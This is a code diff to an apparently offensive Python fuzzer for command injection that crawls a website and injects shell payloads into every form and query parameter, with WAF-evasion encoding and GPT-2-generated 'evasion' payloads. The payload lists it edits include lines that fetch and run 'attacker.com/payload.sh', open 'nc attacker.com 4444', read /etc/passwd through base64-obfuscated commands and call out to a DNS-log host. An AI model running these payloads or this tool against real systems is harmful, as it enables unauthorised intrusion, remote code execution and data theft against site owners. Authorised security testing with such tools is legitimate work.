@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # ════════════════════════════════════════════════════════════════════════════
 #  Next-Generation CMD-Injection AI Fuzzer  (v6.2, 2025-05-10)
+#  Async & Sync Fallback │ Advanced WAF/IDS/Evasion │ AI-Powered │ Structure-Aware
 #  Author : Haroon Ahmad Awan · CyberZeus  <haroon@cyberzeus.pk>
 # ════════════════════════════════════════════════════════════════════════════
 
@@ -31,25 +32,35 @@ from bs4 import BeautifulSoup
 from fake_useragent import UserAgent
 from playwright.sync_api import sync_playwright
 
-# AI / GPU (optional)
+# ── AI / GPU (optional) ─────────────────────────────────────────────────────
+USE_AI = False
+USE_WAF = False
 try:
     import torch
+    from transformers import logging as hf_logging
+    hf_logging.set_verbosity_error()
     from transformers import (
         AutoTokenizer, AutoModelForMaskedLM,
         AutoModelForSequenceClassification, pipeline
     )
     DEVICE = 0 if torch.cuda.is_available() else -1
+    # CodeBERT for mutation
     TOKENIZER_MB = AutoTokenizer.from_pretrained("microsoft/codebert-base")
     MODEL_MB     = AutoModelForMaskedLM.from_pretrained("microsoft/codebert-base").to(DEVICE)
     MODEL_MB.eval()
+    # GPT2 for seed generation
     PG_PIPE = pipeline("text-generation", model="gpt2", device=DEVICE)
-    WF_TOK = AutoTokenizer.from_pretrained("aki203/modsecurity-waf-classifier")
-    WF_MOD = AutoModelForSequenceClassification.from_pretrained("aki203/modsecurity-waf-classifier").to(DEVICE)
-    WF_MOD.eval()
     USE_AI = True
+    # Attempt to load WAF classifier
+    try:
+        WF_TOK = AutoTokenizer.from_pretrained("distilbert-base-uncased")
+        WF_MOD = AutoModelForSequenceClassification.from_pretrained("distilbert-base-uncased").to(DEVICE)
+        WF_MOD.eval()
+        USE_WAF = True
+    except Exception as e:
+        logging.warning(f"[WAF] classifier load failed: {e}")
 except Exception as e:
-    logging.warning(f"[AI] GPU/transformers unavailable → {e}")
-    USE_AI = False
+    logging.warning(f"[AI] GPU/transformers unavailable: {e}")
 
 # ── Config ───────────────────────────────────────────────────────────────────
 VERSION       = "6.2"
@@ -69,6 +80,7 @@ parser.add_argument("--debug", action="store_true")
 parser.add_argument("--sync", action="store_true", help="Use synchronous fallback")
 args = parser.parse_args()
 
+# Logging & warnings
 logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO)
 warnings.filterwarnings("ignore")
 ssl._create_default_https_context = ssl._create_unverified_context
@@ -110,6 +122,8 @@ def jitter():
 #  AI helpers
 # ═══════════════════════════════════════════════════════════════════════════
 async def waf_fingerprint(session, url):
+    if not USE_WAF:
+        return "generic"
     try:
         async with session.get(url, timeout=TIMEOUT) as resp:
             text = await resp.text()
@@ -122,8 +136,11 @@ async def waf_fingerprint(session, url):
 def ai_seeds(prompt, count=2):
     if not USE_AI:
         return []
-    outs = PG_PIPE(prompt, max_length=64, num_return_sequences=count)
-    return [o["generated_text"].strip() for o in outs]
+    try:
+        outs = PG_PIPE(prompt, max_length=64, num_return_sequences=count)
+        return [o["generated_text"].strip() for o in outs]
+    except:
+        return []
 
 def codebert_mutate(cmd):
     if not USE_AI or len(cmd.split()) > 4:
@@ -178,7 +195,7 @@ def build_payload_groups():
 
     for p in [
         'mutation { register(input:{username:"test;id"}){id} }',
-        'query{user(id:"1;curl http://' + DNSLOG_DOMAIN + '"){name}}'
+        'query{user(id:"1;curl http://' + DNSLOG_DOMAIN + '" ){name}}'
     ]:
         add("graphql", p)
 
@@ -200,7 +217,7 @@ def build_payload_groups():
     for p in [urlenc(urlenc("$(id)")), hexify(b64("curl http://" + DNSLOG_DOMAIN))]:
         add("nested", p)
 
-    # Invented variants
+    # Invented variants (examples)
     inv = {
         "xci": ["--file=/tmp/$(id)", '--config="; uname -a #"'],
         "rici":[ "$(echo $(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)|sh)" ],
@@ -213,7 +230,7 @@ def build_payload_groups():
         "ppci":["curl http://127.0.0.1;nc attacker.com 4444"],
         "fdi": ["0<&1; id"],
         "qci": ['\'id" #\''],
-        "bpci":["(ping -c 1 attacker.com &)"],
+        "bpci": ['(ping -c 1 attacker.com &)'],
         "msci":["$(echo $(curl attacker.com/payload.sh)|sh)"],
         "hsci":['<meta http-equiv="refresh" content="0;url=\'http://127.0.0.1/;id\'"/>'],
         "nsci":["$(IFS=' ';echo whoami)"]
@@ -243,7 +260,7 @@ def select_payloads(url, method, params, waf):
     pset = PAYLOAD_GROUPS.get(grp, PAYLOAD_GROUPS["default"]).copy()
     if USE_AI:
         pset += ai_seeds("Generate novel shell evasion payload:", 1)
-    if "modsecurity" in waf.lower():
+    if waf and "modsecurity" in waf.lower():
         pset = [urlenc(p) for p in pset]
     return pset
 
@@ -252,12 +269,11 @@ def select_payloads(url, method, params, waf):
 # ═══════════════════════════════════════════════════════════════════════════
 def crawl_sync(root, cap):
     visited, queue, targets = set(), [root], []
-    domain = urllib.parse.urlparse(root).netloc.lower()
     visited.add(root)
     while queue and len(visited) < cap:
         url = queue.pop(0)
         try:
-            r = requests.get(url, headers=rand_headers(), timeout=TIMEOUT)
+            r = requests.get(url, headers={"User-Agent": UA.random}, timeout=TIMEOUT)
             if "text/html" in r.headers.get("Content-Type",""):
                 soup = BeautifulSoup(r.text,"html.parser")
                 for a in soup.find_all("a", href=True):
@@ -283,8 +299,8 @@ def fuzz_sync(targets, waf):
             for pay in payloads:
                 data = {k: pay if k==p else "test" for k in params}
                 try:
-                    r = requests.get(url, params=data, headers=rand_headers(), timeout=TIMEOUT) if method=="GET"\
-                        else requests.post(url, data=data, headers=rand_headers(), timeout=TIMEOUT)
+                    r = requests.get(url, params=data, headers={"User-Agent": UA.random}, timeout=TIMEOUT) if method=="GET" \
+                        else requests.post(url, data=data, headers={"User-Agent": UA.random}, timeout=TIMEOUT)
                     txt = r.text.lower()
                     if any(x in txt for x in ("uid=","root:x","cyz")):
                         log(f"IN-BAND[{waf}]", url, p, pay); return
@@ -307,86 +323,81 @@ async def crawl_async(root):
     visited = {root}
     queue = [root]
     targets = []
-    session = aiohttp.ClientSession()
-    waf = await waf_fingerprint(session, root)
-    logging.info(f"[WAF] {waf}")
+    async with aiohttp.ClientSession() as session:
+        waf = await waf_fingerprint(session, root)
+        logging.info(f"[WAF] {waf}")
+        async with async_playwright() as pw:
+            browser = await pw.chromium.launch(headless=True)
+            ctx     = await browser.new_context(ignore_https_errors=True)
 
-    async with async_playwright() as pw:
-        browser = await pw.chromium.launch(headless=True)
-        ctx     = await browser.new_context(ignore_https_errors=True)
-
-        while queue and len(visited) < args.max_pages:
-            url = queue.pop(0)
-            try:
-                async with session.get(url, timeout=TIMEOUT) as r:
-                    html = await r.text()
-                if "text/html" in r.headers.get("Content-Type",""):
-                    soup = BeautifulSoup(html,"html.parser")
-                    for a in soup.find_all("a",href=True):
-                        nxt = urllib.parse.urljoin(url, a["href"])
-                        if nxt not in visited:
-                            visited.add(nxt); queue.append(nxt)
-                            if "?" in nxt:
-                                qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(nxt).query))
-                                targets.append((nxt.split("?")[0],"GET",qs))
-                    for f in soup.find_all("form"):
-                        act = urllib.parse.urljoin(url, f.get("action") or url)
-                        names = [i.get("name") for i in f.find_all("input",{"name":True})]
-                        targets.append((act,f.get("method","GET").upper(),names))
-                page = await ctx.new_page()
-                await page.goto(url, wait_until="networkidle", timeout=TIMEOUT*1000)
-                seen=set()
-                async def on_req(req):
-                    if req.url in seen: return
-                    seen.add(req.url)
-                    mtd, u = req.method, req.url
-                    if mtd=="GET" and "?" in u:
-                        qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
-                        targets.append((u.split("?")[0],"GET",qs))
-                    if mtd in ("POST","PUT","PATCH"):
-                        bd = await req.text()
-                        keys = list(urllib.parse.parse_qs(bd).keys()) if "=" in bd\
-                            else (list(json.loads(bd).keys()) if bd.strip().startswith("{") else [])
-                        targets.append((u,mtd,keys))
-                page.on("request", on_req)
-                await page.wait_for_timeout(1000)
-                await page.close()
-            except Exception as e:
-                if args.debug: logging.debug(e)
-
-        await browser.close()
-
-    await session.close()
+            while queue and len(visited) < args.max_pages:
+                url = queue.pop(0)
+                try:
+                    async with session.get(url, timeout=TIMEOUT) as r:
+                        html = await r.text()
+                    if "text/html" in r.headers.get("Content-Type",""):
+                        soup = BeautifulSoup(html,"html.parser")
+                        for a in soup.find_all("a",href=True):
+                            nxt = urllib.parse.urljoin(url, a["href"])
+                            if nxt not in visited:
+                                visited.add(nxt); queue.append(nxt)
+                                if "?" in nxt:
+                                    qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(nxt).query))
+                                    targets.append((nxt.split("?")[0],"GET",qs))
+                        for f in soup.find_all("form"):
+                            act = urllib.parse.urljoin(url, f.get("action") or url)
+                            names = [i.get("name") for i in f.find_all("input",{"name":True})]
+                            targets.append((act,f.get("method","GET").upper(),names))
+                    page = await ctx.new_page()
+                    await page.goto(url, wait_until="networkidle", timeout=TIMEOUT*1000)
+                    seen=set()
+                    async def on_req(req):
+                        if req.url in seen: return
+                        seen.add(req.url)
+                        mtd, u = req.method, req.url
+                        if mtd=="GET" and "?" in u:
+                            qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
+                            targets.append((u.split("?")[0],"GET",qs))
+                        if mtd in ("POST","PUT","PATCH"):
+                            bd = await req.text()
+                            keys = list(urllib.parse.parse_qs(bd).keys()) if "=" in bd \
+                                else (list(json.loads(bd).keys()) if bd.strip().startswith("{") else [])
+                            targets.append((u,mtd,keys))
+                    page.on("request", on_req)
+                    await page.wait_for_timeout(1000)
+                    await page.close()
+                except Exception as e:
+                    if args.debug: logging.debug(e)
+            await browser.close()
     return targets, waf
 
 async def fuzz_async(targets, waf):
     sem = asyncio.Semaphore(args.concurrency)
-    session = aiohttp.ClientSession()
+    async with aiohttp.ClientSession() as session:
+        async def worker(u,m,ps):
+            async with sem:
+                payloads = select_payloads(u, m, ps, waf)
+                for p in ps:
+                    for pay in payloads:
+                        data = {k: pay if k==p else "test" for k in ps}
+                        try:
+                            r = await session.get(u, params=data, timeout=TIMEOUT) if m=="GET" \
+                                else await session.request(m, u, data=data, timeout=TIMEOUT)
+                            txt = await r.text()
+                            if any(x in txt.lower() for x in ("uid=","root:x","cyz")):
+                                log(f"IN-BAND[{waf}]", u, p, pay); return
+                            if "sleep" in pay:
+                                start=time.time()
+                                await session.get(u, params=data, timeout=TIMEOUT+5)
+                                if time.time()-start>5:
+                                    log(f"TIME[{waf}]", u, p, pay); return
+                            jitter()
+                        except:
+                            continue
+        await asyncio.gather(*[worker(u,m,ps) for (u,m,ps) in targets])
 
-    async def worker(u,m,ps):
-        async with sem:
-            payloads = select_payloads(u, m, ps, waf)
-            for p in ps:
-                for pay in payloads:
-                    data = {k: pay if k==p else "test" for k in ps}
-                    try:
-                        r = await session.get(u, params=data, timeout=TIMEOUT) if m=="GET"\
-                            else await session.request(m, u, data=data, timeout=TIMEOUT)
-                        txt = await r.text()
-                        if any(x in txt.lower() for x in ("uid=","root:x","cyz")):
-                            log(f"IN-BAND[{waf}]", u, p, pay); return
-                        if "sleep" in pay:
-                            start=time.time()
-                            await session.get(u, params=data, timeout=TIMEOUT+5)
-                            if time.time()-start>5:
-                                log(f"TIME[{waf}]", u, p, pay); return
-                        jitter()
-                    except:
-                        continue
-
-    await asyncio.gather(*[worker(u,m,ps) for (u,m,ps) in targets])
-    await session.close()
-
+# ═══════════════════════════════════════════════════════════════════════════
+#  Logging helper
 # ═══════════════════════════════════════════════════════════════════════════
 def log(mode, url, param, payload):
     entry = f"- **{mode}** `{url}` • **{param}** → `{payload}`\n"
@@ -394,6 +405,9 @@ def log(mode, url, param, payload):
         f.write(entry)
     logging.info(entry.strip())
 
+# ═══════════════════════════════════════════════════════════════════════════
+#  Main routines
+# ═══════════════════════════════════════════════════════════════════════════
 async def main_async():
     if not LOGFILE.exists():
         LOGFILE.write_text(f"# Next-Gen CMDi v{VERSION}\n\n")
@@ -413,7 +427,7 @@ def main_sync():
     try:
         r = requests.get(root, timeout=TIMEOUT)
         waf = "generic"
-        if USE_AI:
+        if USE_WAF:
             txt = r.text
             inputs = WF_TOK(txt, return_tensors="pt", truncation=True).to(DEVICE)
             logits = WF_MOD(**inputs).logits
@@ -422,7 +436,7 @@ def main_sync():
     except:
         waf = "generic"
     targets = crawl_sync(root, args.max_pages)
-    logging.info(f"[+] {len(targets)} endpoint")
+    logging.info(f"[+] {len(targets)} endpoints found")
     fuzz_sync(targets, waf)
     logging.info(f"[✓] Done → {LOGFILE.resolve()}")
 
